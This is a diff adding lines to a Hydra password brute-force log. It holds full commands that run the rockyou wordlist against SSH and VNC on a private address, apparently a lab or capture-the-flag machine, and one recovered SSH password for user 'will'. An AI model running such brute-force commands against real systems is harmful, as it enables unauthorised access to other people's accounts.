@@ -18,3 +18,15 @@
 # Hydra v9.3 run at 2022-03-07 13:48:26 on bahsy ssh (hydra -l bashy -P rockyou.txt -vV -t 64 -o output.txt -I ssh://bahsy)
 # Hydra v9.3 run at 2022-03-07 13:48:38 on 10.3.37.27 ssh (hydra -l 10.3.37.27 -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
 # Hydra v9.3 run at 2022-03-07 13:49:29 on 10.3.37.27 ssh (hydra -l 10.3.37.27 -P rockyou.txt -vV -o output.txt -I ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-08 07:44:20 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -o output.txt -I ssh://10.3.37.27)
+[22][ssh] host: 10.3.37.27   login: will   password: Lucy!@#!@#!@#
+# Hydra v9.3 run at 2022-03-08 07:45:03 on 10.3.37.27 vnc (hydra -P rockyou.txt -vV -o output.txt -I vnc://10.3.37.27)
+# Hydra v9.3 run at 2022-03-08 07:45:31 on 10.3.37.27 vnc (hydra -P rockyou.txt -vV -o output.txt -I vnc://10.3.37.27)
+# Hydra v9.3 run at 2022-03-08 07:46:45 on 10.3.37.27 vnc (hydra -P rockyou.txt -vV -o output.txt -I vnc://10.3.37.27)
+# Hydra v9.3 run at 2022-03-08 07:47:10 on 10.3.37.27 vnc (hydra -P rockyou.txt -vV -o output.txt -I vnc://10.3.37.27)
+[5900][vnc] host: 10.3.37.27   password:  
+# Hydra v9.3 run at 2022-03-09 07:38:19 on unkown vnc (hydra -P rockyou.txt -vV -o output.txt -I vnc://unkown)
+# Hydra v9.3 run at 2022-03-09 07:38:33 on 10.3.37.27 vnc (hydra -P rockyou.txt -vV -o output.txt -I vnc://10.3.37.27)
+[5900][vnc] host: 10.3.37.27   password:  
+# Hydra v9.3 run at 2022-03-09 08:15:42 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -o output.txt ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-09 08:16:05 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -t 64 -o output.txt ssh://10.3.37.27)
